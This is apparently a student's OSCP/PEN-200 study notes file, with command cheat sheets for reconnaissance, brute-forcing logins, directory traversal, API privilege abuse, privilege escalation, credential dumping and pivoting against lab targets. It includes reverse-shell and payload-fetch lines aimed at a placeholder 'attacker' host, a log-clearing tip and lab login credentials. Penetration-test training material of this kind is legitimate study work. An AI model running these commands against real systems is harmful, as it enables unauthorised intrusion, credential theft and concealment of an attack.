## 📑 Table of Contents

- [Resources](#resources)
- [Methodology](#methodology)
- [PWK-200 syallabus](#pwk-200-syallabus)
- [PWK-200 labs](#pwk-200-labs)  
  - [Information gathering](#information-gathering)
- [Penetration testing report](#penetration-testing-report)
- [Penetration testing stages](#penetration-testing-stages)
- [Kali setup](#kali-setup)
- [Recommended OSCP Cracking Tools & Usage (2025)](#recommended-oscp-cracking-tools-&-usage-(2025))
- [OSCP Pro Tips](#oscp-pro-tips)
- 

## Resources
- [OffSec student portal](https://help.offsec.com/hc/en-us/articles/9550819362964-Connectivity-Guide) 
- [OffSec Discord](https://discord.gg/offsec)
  - OffSec portal > Explorer > Discord > link OffSec account to discord
- [OffSec Study Plan and Exam FAQ](https://help.offsec.com/hc/en-us/sections/6970444968596-Penetration-Testing-with-Kali-Linux-PEN-200)
- PWK Labs  
  - Credentials (🔒 username:Eric.Wallows, password:EricLikesRunning800)
  - Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`

## Methodology 

## Protocols login
| Protocol        | Port    | Tool                | Kali 2025 Login Command Example                                                                                      |
|-----------------|---------|---------------------|----------------------------------------------------------------------------------------------------------------------|
| **SSH**         | 22      | `ssh`               | `ssh user@10.10.10.10`                                                                                                |
|                 |         | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10`                                               |
| **FTP**         | 21      | `ftp`               | `ftp 10.10.10.10`                                                                                                    |
|                 |         | `hydra`             | `hydra -l anonymous -p '' ftp://10.10.10.10`                                                                         |
| **Telnet**      | 23      | `telnet`            | `telnet 10.10.10.10`                                                                                                 |
|                 |         | `hydra`             | `hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.10`                                              |
| **HTTP(S)**     | 80/443  | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"` |
| **SMB**         | 445     | `smbclient`         | `smbclient -L //10.10.10.10 -U user%password`                                                                         |
|                 |         | `smbmap`            | `smbmap -H 10.10.10.10 -u user -p password`                                                                           |
|                 |         | `crackmapexec`      | `crackmapexec smb 10.10.10.10 -u user -p password`                                                                    |
| **RDP**         | 3389    | `xfreerdp`          | `xfreerdp3 /v:10.10.10.10 /u:user /p:Pass123 /cert-ignore`                                                             |
|                 |         |                     | `xfreerdp3 /v:10.10.10.10 /u:user /pth:0123456789ABCDEF0123456789ABCDEF /cert-ignore`                                  |
| **WinRM**       | 5985    | `evil-winrm`        | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123`                                                               |
|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -H AABBCCDDEEFF00112233445566778899`                                        |
|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123 -S`  (SSL mode)                                                 |
| **MySQL**       | 3306    | `mysql`             | `mysql -h 10.10.10.10 -u root -p`                                                                                      |
| **PostgreSQL**  | 5432    | `psql`              | `psql -h 10.10.10.10 -U postgres`                                                                                      |
| **MSSQL**       | 1433    | `impacket-mssqlclient.py` | `mssqlclient.py user@10.10.10.10 -windows-auth`                                                                    |
|                 |         |                     | `mssqlclient.py user@10.10.10.10 -windows-auth -hashes :<NTLM_HASH>`                                                   |
| **VNC**         | 5900    | `vncviewer`         | `vncviewer 10.10.10.10:5900`                                                                                           |
|                 |         | `hydra`             | `hydra -P /usr/share/wordlists/rockyou.txt -t 4 vnc://10.10.10.10`                                                    |
| **POP3**        | 110     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://10.10.10.10`                                                 |
| **IMAP**        | 143     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt imap://10.10.10.10`                                                 |
| **LDAP**        | 389     | `ldapsearch`        | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=local"`                                                                |
| **SNMP**        | 161     | `snmpwalk`          | `snmpwalk -v2c -c public 10.10.10.10`                                                                                   |
| **NFS**         | 2049    | `showmount`         | `showmount -e 10.10.10.10`                                                                                             |
|                 |         | `mount`             | `mount -t nfs 10.10.10.10:/share /mnt`                                                                                 |

## PWK-200 syallabus
6. Information gathering
   **Passive**
   - **OSINT**: public available info of a target
   - **Whois**: domain name info  
     `whois megacorpone.com -h 192.168.50.251`: lookup personnel contact, name server  
     `whois 38.100.193.70 -h 192.168.50.251`: reverse lookup
   - **google hacking**: uncover critical information, vulnerabilities, and misconfigured websites  
     `site:mega.com filetype:txt`  
     `site:mega.com -filetype:html` : exclude html page  
     `intitle: "index of" "parent directory"`: directory listing
   - [Google hacking database](https://www.exploit-db.com/google-hacking-database)
   - [faster google dorking](https://dorksearch.com/)
   - [Netcraft](https://searchdns.netcraft.com/): discover site tech, subdomains
   - [wappalzer](https://www.wappalyzer.com/websites/<domain>/)
   - **open-source code** search (small repo:[GitHub](https://github.com/), [GitHub Gist](https://gist.github.com/), [GitLab](https://about.gitlab.com/), [SourceForge](https://sourceforge.net/). larger repos: [Gitrob](https://github.com/michenriksen/gitrob), [Gitleaks](https://github.com/zricethezav/gitleaks))  
     `./gitleaks dir /home/kali/offsec/megacorpone.com/megacorpone -v`: scans for API keys, private keys, credentials
   - [Shodan](https://www.shodan.io/): search engine for internet-connected devices to discover servers, devices, DBs, IoT
   - [security headers and SSL/TLS](https://securityheaders.com/)
   - [Qualys SSL Labs](https://www.ssllabs.com/ssltest/)
   - LLM: chatGPT prompt; can you provide the best 20 google dorks for megacorpone.com website tailored for a penetration test; Retrieve the technology stack of the megacorpone.com website; 20 Google dorks aimed to our target website
   - [Datanyze](),6sense(): web tech stack response

   **Active**
   - **DNS (friendly domain names to IP)**
     - NS (authoritative server), A (IPv4), AAAA (Ipv6), MX (Main exchange), PTR (reverse lookup zones), CNAME (alias for other host records), TXT (domain ownershiip verification)
     - `host www.megacorpone.com`: use host to find IP/A record
     - `host -t mx www.megacorpone.com`: use -t to find other record types  
     - `host -t txt megacorpone.com`: find more info  
     - `host idontexist.megacorpone.com`: use host to search invalid host
     - `for ip in $(cat /usr/share/seclists); do host $ip.megacorpone.com; done`: find possible hostname. Note: `sudo apt install seclists`
     - `for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"`: using reverse DNS lookups to scan IP 51.122.169.200-254 and filter out not found results
     - `dnsrecon -d megacorpone.com -t std`: automate DNS enumeration (domain name + standard type enumeration)
     - `dnsrecon -d megacorpone.com -D ~/list.txt -t brt`: brute force hostname by dnsrecon
     - `dnsenum megacorpone.com`: automate DNS enumeration
     - `xfreerdp /u:student /p:lab /v:192.168.50.152`: rdp login
     - `nslookup mail.megacorptwo.com`: use nslookup to enumerate host
     - `nslookup -type=TXT info.megacorptwo.com 192.168.50.151`: use nslookup to query more info
   - **TCP/UDP port scan**
     - `nc -nvv -w 1 -z 192.168.50.152 3388-3390`: netcat TCP port scan
     - `nc -nv -u -z -w 1 192.168.50.149 120-123`: netcat UDP port scan
     - `nmap 192.168.50.149`: default 1000 ports scan
     - `sudo nmap -sS 192.168.50.149`: SYN/stealth scan
     - `nmap -sT 192.168.50.149`: TCP connect scan
     - `sudo nmap -sU 192.168.50.149`: UDP scan
     - `sudo nmap -sU -sS 192.168.50.149`: UDP + SYN scan (reveal additional open UDP ports)
     - `nmap -sn 192.168.50.1-253`: network sweep for large volumes of hosts. 
     - `nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt` `grep Up ping-sweep.txt | cut -d " " -f 2`: grep live host
     - `nmap -p 80 192.168.50.1-253 -oG web-sweep.txt`: scan for port 80
     - `nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt`: scan multiple IPs
     - `cat /usr/share/nmap/nmap-services`: show open frequency
     - `sudo nmap -O 192.168.50.14 --osscan-guess`: OS finger printing
     - `nmap -sT -A 192.168.50.14`: banner grabbing and/or service enumeration
     - `nmap --script http-headers 192.168.50.6`: nmap’s scripting engine (NSE) for OS fingerprinting
     - `Test-NetConnection -Port 445 192.168.50.151`: Port scanning SMB via PowerShell. Result returns TcpTestSucceeded : True
     - `1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null`: Automating the PowerShell portscanning****
   - **SMB Enumeration**
   - **SMTP Enumeration**
   - **SNMP Enumeration**
   - **nmap**  
     `nmap -sVC -p- -v -T4 -sT --open IP_ADDRESS -oN results`: scans all open 65535 TCP ports  
     `sudo nmap -sU -p 1-1024 -v IP_ADDRESS -oA results_UDP`: scans 1-1024 common UDP ports  

      | Flag         | Description                                                                 |
      |--------------|-----------------------------------------------------------------------------|
      | `-sV`        | Enables **version detection** to identify software versions on services     |
      | `-sC`        | Runs Nmap’s **default NSE scripts** (same as `--script=default`)            |
      | `-p-`        | Scans **all 65535 TCP ports**                                               |
      | `-v`         | Enables **verbose output** to see scan progress in real time                |
      | `-T4`        | Sets scan to **aggressive timing** (faster, less stealthy)                  |
      | `-sT`        | Performs a **TCP connect scan** (full 3-way handshake, useful if not root)  |
      | `--open`     | Shows **only open ports**, hides closed or filtered ports                   |
      | `IP_ADDRESS` | Target IP address to scan (replace with actual target)                      |
      | `-oN results`| Saves output in **normal format** to a file named `results`                 |

  **LLM Passive Information Gathering**
  - ddd
  - ddd
  - ddd
    
8. Vulnerability scanning
9. Introduction to web applcation attacks
   - Fingerprinting Web Servers with Nmap
     `sudo nmap -p80 -sV 192.168.50.20`: grab the web server banner
     `sudo nmap -p80 --script=http-enum 192.168.50.20`: fingerprint web server
   - [Wappalyzer](https://www.wappalyzer.com/): technology stack
   - [Gobuster](https://www.kali.org/tools/gobuster/): wordlists to discover directories and files
     `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t5`  
   - Burp Suite
     - Only http traffic, no cert install_, enable_intercept(forward or drop), proxy listerner on localhost:8080
     - Browser proxy setting: about:preferences#general > settings > networks setting > http proxy (host 127.0.0.1,port 8080 + use this proxy for HTTPS) & SOCKSv4 (host 127.0.0.1, port 9060)
   - Burp Suite intercept, repeater (send request), intruder (brute force attack in $position)
   - URL file extension, Debug page content (browser web developer tool + pretty print + inspector tool)
   - inspect HTTP response headers and sitemaps in browser web developer tool >network tab
   - sitemaps `curl https://www.google.com/robots.txt`
   - Gobuster: enumerate APIs  
     **pattern file**  
     {GOBUSTER}/v1  
     {GOBUSTER}/v2  
  
     ```
     gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
     
     curl -i http://192.168.50.16:5002/users/v1
     
     gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
     
     curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json http://192.168.50.16:5002/users/v1/login

     curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register

     curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register  

     curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:application/json' http://192.168.50.16:5002/users/v1/login

     curl -X 'PUT' \
      'http://192.168.50.16:5002/users/v1/admin/password' \
      -H 'Content-Type: application/json' \
      -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb IHbJI7f9KaRAkrywoaRUAsgA4' \
      -d '{"password": "pwned"}'
      ```
   - dd
10. Common Web Application attacks
    - **Directory traversal**: access files outside of the web root by using relative paths
      - absolute path: `cat /home/kali/etc/passwd`  
      - relative path: `cat ../../etc/pwd`: move 2 directories back to root file
      - extra ../sequence: `cat ../../../../../../../../../../../etc/passwd`
      - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
        The output of /etc/passwd shows a user called "offsec"
      - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
      - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
    - File inclusion vulnerabilities
    - File upload vulnerabilities
    - Command injection
11. SQL injection attacks
12. Phishing Basics
13. Client-site attacks
14. Locating public exploits
15. Fixing exploits
16. Antivirus evasion
17. Password attacks
    - confirm ssh service running
      `sudo nmap -sV -p 2222 192.168.50.201`
    - unzip rockyou
      `cd /usr/share/wordlists/   sudo gzip -d rockyou.txt.gz`
    - hydra crack user george  
      `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`
    - password spraying > enumerate username from a valid password
      `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.160.201`
    - ddd
    - ddd
    - ddd
18. Windows Privilege Escalation
    - Goal: bypass UAC to execute at high integrity (admin member does not mean run with high integrity)
    - Enumeration
      - username, hostname: `whoami`
      - existing users & groups: `whoami /groups`
      - enumerate the existing groups of user: `Get-LocalGroup` (powershell)
      - other users and groups: `Get-LocalUser` (powershell)
      - review the group member: `Get-LocalGroupMember adminteam`
      - OS, version, architecture, network info, installed apps, running processes
    - 
    - Security Identifier (SID)
      - Local Security Authority (LSA) - local users
      - Domain Controller (DC) - domain users
      - Format: S-1-5-21-3623811015-3361044348-30300820-1013
      - RID (last digit of SID): 500 (admin), 501 (guest), 1000+ (normal user), 512 (domain admins), 513 (domain users)
      - S-1-0-0 (nobody), S-1-1-0 (everybody), S-1-5-11 (authenticated users), S-1-5-18 (local system), S-1-5-domainidentifier-500 (administrator)
    - access token
      - primary token: specify permission sets  
      - impersonation token  
    - Mandatory Integrity Control
      - integrity levels: system (kernel), high (admin), medium (standard), low (restricted). Process explorer can see the integrity level.
    - User Account Control
      - standard user token (non-privileged operations)
      - administrator token (require UCA concent prompt)
19. Linux privilege escalation
20. Port redirection and SSH tunneling
21. Tunneling through deep packet inspectation
22. The metassploit framework
23. Active directory introduction and enumeration
24. Attacking active drectiory authentication
25. Lateral movement in active directory
26. Enumerating AWS Cloud Infrastruture
27. Attacking AWS cloud infrastruture 
28. Assembling the pieces

## PWK-200 labs
### Information gathering
- 6.2.1 Whois Enumeration  
  `whois megacorpone.com -h 192.168.50.251`
- 6.2.2 Google Hacking  
  `site:megacorpone.com intext:"VP of Legal"`  
  `site:linkedin.com/in "MegaCorp One"`    
  Google: rocketreach.co "MegaCorp One"
- 6.2.3 Netcraft  
  `https://sitereport.netcraft.com/?url=http://www.megacorpone.com` (View the report under section Network & site technology)
- 6.2.4 Open-Source Code  
  `./gitleaks dir /home/kali/offsec/megacorpone.com/megacorpone -v` (No leaks)  
  `nano config/gitleaks.toml`  
  ```
  [[rules]]
  id = "apache-htpasswd-md5"
  description = "Detect Apache htpasswd MD5 hash (APR1)"
  regex = '''(?i)\b[a-z0-9._%-]+:\$apr1\$[A-Za-z0-9./$]{8,}'''
  keywords = ["$apr1$"]
  tags = ["password", "apache", "htpasswd"]
  ```
  `./gitleaks dir /home/kali/offsec/megacorpone.com/megacorpone -v -c=config/gitleaks.toml` (Leaks found on home/kali/offsec/megacorpone.com/megacorpone/xampp.users)  
- 6.2.5 Shodan
- 6.2.6 Security Headers and SSL/TLS

### Password Attacks  
- 16.1.1 SSH and RDP
  **SSH** guess password
  `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`
  **RDP** guess user and export flag to local
  `hydra -L /usr/share/wordlists/test_small_credentials.txt -p "SuperS3cure1337#" rdp://192.168.160.202`: crack username
  `mkdir -p ~/shared`: create shared folder
  `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.160.202 /cert:ignore /drive:share,/home/kali/shared`: login to RDP and export flag to local
  **ftp** guess password
  `hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.160.202`
  `ftp itadmin@192.168.160.202`
  `get flag.txt`
- 16.1.2 HTTP POST Login Form
  
- 16.2.1

## Penetration testing report 
- note editor:
  - [Sublime-syntax highlight](https://www.sublimetext.com/download)
  - [CherryTree Kali](https://github.com/giuspen/cherrytree)
  - [Obsidian-markdown editor](https://obsidian.md/)
- taking screenshots:
  - snipping tool （win:win+shift+S. Linux:shift+print screen)
  - [flameshot](https://github.com/flameshot-org/flameshot)
- penetration testing notes: application name, URL, request type, issue detail, proof of concept payload  
- effective penetration testing report
  - purpose: highlights all the present flaws, remediation, scope
  - tailor for audience:  
    - **c-suite**: scope + timeframeout, rules of engagement + methodology + executive summary (impact/work-case scenario, trends, strategic advise)  
     **--engagement**    
     The Client hired OffSec to conduct a penetration test of their kali.org web application in October of 2025. The test was conducted from a remote IP between the hours of 9 AM and 5 PM, with no users provided by the Client."  
     **--positives**    
     The application had many forms of hardening in place. First, OffSec was unable toupload malicious files due to the strong filteringin place. OffSec was also unable to brute force user accountsbecause of the robust lockout policy in place. Finally, the strongpassword policy made trivial password attacks unlikely to succeed.This points to a commendable culture of user account protections    
     **--vulnerabilities**    
     However, there were still areas of concern within the application.OffSec was able to inject arbitrary JavaScript into the browser ofan unwitting victim that would then be run in the context of thatvictim. In conjunction with the username enumeration on the loginfield, there seems to be a trend of unsanitized user input compoundedby verbose error messages being returned to the user. This can leadto some impactful issues, such as password or session stealing. It isrecommended that all input and error messages that are returned to theuser be sanitized and made generic to prevent this class of issue fromcropping up.  
     **--conclusion**    
     These vulnerabilities and their remediations are described in moredetail below. Should any questions arise, OffSec is happyto provide further advice and remediation help
    - **technical staff/summary**: technical detail + impact + remediation    
      - User and Privilege Management
      - Architecture
      - Authorization
      - Patch Management
      - Integrity and Signatures
      - Authentication
      - Access Control
      - Audit, Log Management and Monitoring
      - Traffic and Data Encryption
      - Security Misconfigurations
       
     Patch Management  
     Windows and Ubuntu operating systems that are not up to date wereidentified. These are shown to be vulnerable to publicly-availableexploits and could result in malicious execution of code, theftof sensitive information, or cause denial of services which        mayimpact the infrastructure. Using outdated applications increases thepossibility of an intruder gaining unauthorized access by exploitingknown vulnerabilities. Patch management ought to be improved andupdates should be applied in conjunction with change      management.
    - **technical findings and recommendation** (what vulnerability is + why dangerous + outcome + steps to exploit)  
      <img src="https://github.com/xasyhack/oscp2025/blob/main/images/Table%202%20-%20Findings%20and%20Recommendations.png" alt="Alt text" width="400"/>  
      affected URL/endpoint + method of triggering the vulnerability  
    - **appendices**: articles, reference

## Penetration testing stages
1. scope: IP range, hosts, applications
1. info gathering (passive or active): org infra, assets, personnel
1. vulnerability detection
1. initial foothold
1. privilege escalation
1. lateral movement
1. report
1. remediation

## Kali setup
1. Register [Broadcom account](https://profile.broadcom.com/web/registration)
1. Download "VMware Workstation Pro"
1. Download [Kali VM](https://help.offsec.com/hc/en-us/articles/360049796792-Kali-Linux-Virtual-Machine)
1. Launching the VM (browse the .vmx file)
1. Login kali (🔒 username:kali, password:kali)
1. Kali terminal `sudo updatedb`
1. Download VPNs from OffSec portal (Explorer > VPN)
1. Connect to PWK Lab
   - `locate universal.ovpn`
   - `cd /home/kali/Downloads`
   - `mkdir /home/kali/offsec`
   - `mv universal.ovpn /home/kali/offsec/universal.ovpn`
   - `cd ../offsec`
   - `sudo openvpn universal.ovpn`
   - output reads "Initialization Sequence Completed"
   - disconnect VPN by pressing Ctrl+C
1. Package install
   - `sudo apt update`
   - `sudo apt install golang`
 1. Recommended software
    - Notetaking: [notion.so](http://notion.so)  or Obsidian
    - Scanning tool: [Rustscan](https://github.com/RustScan/RustScan/releases)  
      `dpkg -i rustscan_2.3.0_amd64.deb`
    - file upload/transfer purpose: Updog    
      ```  
      pip3 install updog  
      export PATH="/home/kali/.local/bin:$PATH"
      ```
    - Privilege Escalation: peass  
      `sudo apt install peass`
    - DNS: Gobuster  
      `sudo apt install gobuster`
    - Hosting a WebDAV share (for exploits, exfil, or testing): WsgiDAV  
      `sudo apt install wsgidav`
    - Lateral movement / privilege escalation: Bloodhound  
      `sudo apt update && sudo apt install -y bloodhound`
    - Stores AD data for querying & analysis: Neo4j  
      `sudo neo4j console`

## Recommended OSCP Cracking Tools & Usage (2025)
| Tool              | Purpose                                  | Sample Command | Info / Output |
|------------------|------------------------------------------|----------------|----------------|
| **nmap**          | Port scan, service/version detection      | `nmap -sC -sV -oN scan.txt 10.10.10.10` | Shows open ports, services, versions, default scripts |
| **AutoRecon**     | Automated enumeration pipeline            | `autorecon 10.10.10.10` | Organizes scans, runs Nmap, Gobuster, LinPEAS automatically |
| **Gobuster**      | Web directory brute-force                 | `gobuster dir -u http://target -w common.txt` | Lists hidden directories or files |
| **Feroxbuster**   | Recursive web content discovery           | `feroxbuster -u http://target -w wordlist.txt` | Recursively finds directories/files |
| **FFUF**          | Fast web fuzzing                          | `ffuf -u http://target/FUZZ -w wordlist.txt` | Reveals valid endpoints via response codes |
| **WFuzz**         | Web input fuzzing                         | `wfuzz -c -z file,rockyou.txt --hc 404 http://target/FUZZ` | Discovers fuzzable parameters, paths |
| **Nikto**         | Web server vulnerability scanner          | `nikto -h http://target` | Lists known issues in web server setup |
| **Burp Suite**    | Manual/intercept web testing              | GUI Tool       | Captures/fuzzes requests, intercepts traffic |
| **Hydra**         | Brute-force remote logins                 | `hydra -l admin -P rockyou.txt ssh://10.10.10.10` | Cracks login credentials |
| **John the Ripper** | Offline hash cracking                   | `john hash.txt --wordlist=rockyou.txt` | Cracked hash output |
| **Hashcat**       | GPU-based hash cracking                   | `hashcat -m 1000 hash.txt rockyou.txt` | Fast crack of NTLM or other hashes |
| **wget**          | Download files                            | `wget http://10.10.10.10/file.sh` | Saves remote file locally |
| **curl**          | File transfer / request testing           | `curl -O http://10.10.10.10/file.sh` | Displays or downloads response |
| **ncat** (netcat) | File transfer, bind/reverse shell         | `ncat -lvnp 4444` / `ncat -e /bin/bash attacker 4444` | Listener or shell |
| **ssh**           | Remote login via SSH                      | `ssh user@10.10.10.10` | Secure shell access |
| **python**        | Simple webserver, reverse shell, etc.     | `python3 -m http.server` or `python -c 'reverse shell'` | Serve payloads or pop shells |
| **Impacket**      | Remote access tools (SMB/RPC)             | `wmiexec.py user:pass@10.10.10.10` | Remote shell, file transfer, SID enumeration |
| **CrackMapExec**  | SMB tool + post-exploitation              | `cme smb 10.10.10.10 -u user -p pass` | Check share access, dump hashes, validate creds |
| **Responder**     | LLMNR/NetBIOS poisoning                   | `responder -I eth0` | Captures NTLMv2 hashes |
| **LinPEAS**       | Linux privilege escalation script         | `./linpeas.sh` | Highlights privesc vectors in color |
| **WinPEAS**       | Windows privilege escalation script       | `winPEASx64.exe` | Checks for service misconfigs, ACLs, registry abuse |
| **Chisel**        | Tunneling over HTTP                       | `chisel server -p 9001` / `chisel client attacker:9001 R:localhost:3389` | Pivoting, port forwarding |
| **Mimikatz**      | Credential dumping (Windows)              | `privilege::debug`, `sekurlsa::logonpasswords` | Reveals passwords, hashes, tickets |
| **msfvenom**      | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe` | Generates reverse shell binaries |
| **Metasploit**    | Exploits + post modules                   | `msfconsole` → use exploits | Interactive exploit framework with session management |

## 📝 OSCP Pro Tips
- Always start with **Nmap**, **AutoRecon**, and web enumeration tools.
- Use **Burp**, **WFUF**, and **Feroxbuster** for web fuzzing.
- After access, use **LinPEAS** or **WinPEAS** for privilege escalation paths.
- Use **Impacket**, **CME**, or **Chisel** for pivoting.
- Crack hashes using **John**, **Hashcat**, or online resources.

| Tip Category       | Tip |
|--------------------|-----|
| **General Strategy** | Start with **AutoRecon or manual Nmap**, then branch into web (Gobuster/Feroxbuster), SMB (CME/Impacket), or known services. |
| **Time Management** | Spend no more than 1 hour per box if you're stuck. Move on and return later. |
| **Initial Foothold** | Look for unauthenticated pages, exposed SMB/NFS shares, backup files (`.bak`, `.zip`), default creds. |
| **Passwords** | Try **rockyou.txt** and known weak creds. Look for reused passwords across services. |
| **Linux Privesc** | Run `linpeas.sh`, check for SUID binaries, writable `/etc/passwd`, crontabs, misconfigured services. |
| **Windows Privesc** | Use `winPEAS`, `whoami /priv`, and check for AlwaysInstallElevated, weak folder permissions, unquoted service paths. |
| **Reverse Shell Tips** | Use `ncat`, `msfvenom`, or `bash -i >& /dev/tcp` variants. Have multiple listeners ready (4444, 5555). |
| **Pivoting** | Use **Chisel** or **SSH tunnels** to reach internal networks. Don’t overlook second-level escalation. |
| **Reporting** | Take screenshots of each flag, privilege escalation step, and exploit. Label clearly. |
| **Persistence** | If you lose shell, try to re-exploit quickly. Always upload a reverse shell backup (`nc.exe`, `bash shell`, etc.). |
| **VPN Stability** | If VPN disconnects, your *target machines will reset*. Save all notes **locally** in case of resets. |
| **Proof Files** | Submit `proof.txt` and `local.txt` for each rooted box. These are essential for point calculation. |
| **Mental Game** | Stay calm. 3 roots + 1 user = pass. Don’t panic over one tough box. Maximize your strengths. |

## 🟡 1. Information Gathering / Recon
| Tool            | Purpose                                | Sample Command |
|-----------------|----------------------------------------|----------------|
| `nmap`          | Port scanning, service/version detect  | `nmap -sC -sV -oN scan.txt 10.10.10.10` |
| `AutoRecon`     | Automated recon pipeline               | `autorecon 10.10.10.10` |
| `whatweb`       | Detect web technologies                | `whatweb http://target` |
| `gobuster`      | Web dir brute-force                    | `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt` |
| `feroxbuster`   | Recursive web discovery                | `feroxbuster -u http://target -w wordlist.txt` |
| `ffuf`          | Web fuzzing                            | `ffuf -u http://target/FUZZ -w wordlist.txt` |
| `nikto`         | Web vulnerability scanner              | `nikto -h http://target` |
| `whatweb`       | Identify web frameworks                 | `whatweb http://target` |
| `theHarvester`  | Email, domain, subdomain harvesting    | `theharvester -d target.com -b google` |
| `amass`         | Subdomain enumeration                  | `amass enum -d target.com` |

## 🔵 2. Enumeration
| Tool             | Purpose                                 | Sample Command |
|------------------|-----------------------------------------|----------------|
| `enum4linux-ng`  | Enumerate Windows shares, users         | `enum4linux-ng -A 10.10.10.10` |
| `crackmapexec`   | SMB, RDP, WinRM share/user checks       | `cme smb 10.10.10.10 -u user -p pass` |
| `smbclient`      | Access SMB shares                       | `smbclient //10.10.10.10/share` |
| `ldapsearch`     | Query LDAP directory                    | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=com"` |
| `snmpwalk`       | SNMP device enumeration                 | `snmpwalk -v2c -c public 10.10.10.10` |
| `sqlmap`         | Automated SQLi and DB dump              | `sqlmap -u "http://target?id=1" --dbs` |
| `wfuzz`          | Web fuzzing                             | `wfuzz -c -z file,wordlist.txt --hc 404 http://target/FUZZ` |
| `impacket-samrdump` | SAMR info enumeration                | `samrdump.py 10.10.10.10` |

## 🟢 3. Gaining Access (Exploitation)

| Tool           | Purpose                                  | Sample Command |
|----------------|------------------------------------------|----------------|
| `msfvenom`     | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe > shell.exe` |
| `Metasploit`   | Framework for exploitation                | `msfconsole → use exploit/multi/handler` |
| `ncat`         | Reverse shell handling                    | `ncat -lvnp 4444` |
| `python`       | Simple webserver                          | `python3 -m http.server 80` |
| `wget` / `curl`| File retrieval                            | `wget http://attacker/shell.sh` |
| `searchsploit` | Local exploit database search             | `searchsploit apache 2.4` |
| `nishang`      | PowerShell payloads                       | Import scripts for Windows shells |

## 🟠 4. Privilege Escalation
| Tool             | Purpose                                | Sample Command |
|------------------|----------------------------------------|----------------|
| `linpeas.sh`     | Linux privesc script                    | `./linpeas.sh` |
| `winPEAS.exe`    | Windows privesc script                  | `winPEASx64.exe` |
| `sudo -l`        | List sudo privileges                    | `sudo -l` |
| `pspy`           | Monitor Linux processes                 | `./pspy64` |
| `linux-exploit-suggester.sh` | Kernel exploit suggestions | `./linux-exploit-suggester.sh` |
| `windows-exploit-suggester.py` | Windows patch-based escalation | `python windows-exploit-suggester.py` |
| `mimikatz`       | Credential dumping on Windows           | `sekurlsa::logonpasswords` |

## 🔴 5. Post-Exploitation / Lateral Movement
| Tool             | Purpose                                | Sample Command |
|------------------|----------------------------------------|----------------|
| `wmiexec.py`     | Remote command execution via WMI       | `wmiexec.py user:pass@target` |
| `psexec.py`      | Run commands via SMB                   | `psexec.py user:pass@target` |
| `secretsdump.py` | Dump Windows hashes                    | `secretsdump.py user:pass@target` |
| `chisel`         | TCP tunneling / pivoting               | `chisel client attacker:9001 R:127.0.0.1:3389` |
| `responder`      | LLMNR poisoning                        | `responder -I eth0` |
| `BloodHound`     | AD enumeration via neo4j               | Use with `SharpHound` collector |

## 🟣 6. Reporting & Cleanup
| Tool              | Purpose                               | Sample Command |
|-------------------|---------------------------------------|----------------|
| `asciinema`       | Terminal session recording            | `asciinema rec` |
| `screenshot tools`| Capture flags / proof steps           | Manual or `gnome-screenshot` |
| `cherrytree`      | Reporting and note keeping            | GUI |
| `keepnote`        | Note organization                     | GUI |
| `rm`, `Clear-EventLog` | Clean traces (if allowed)        | Manual cleanup |
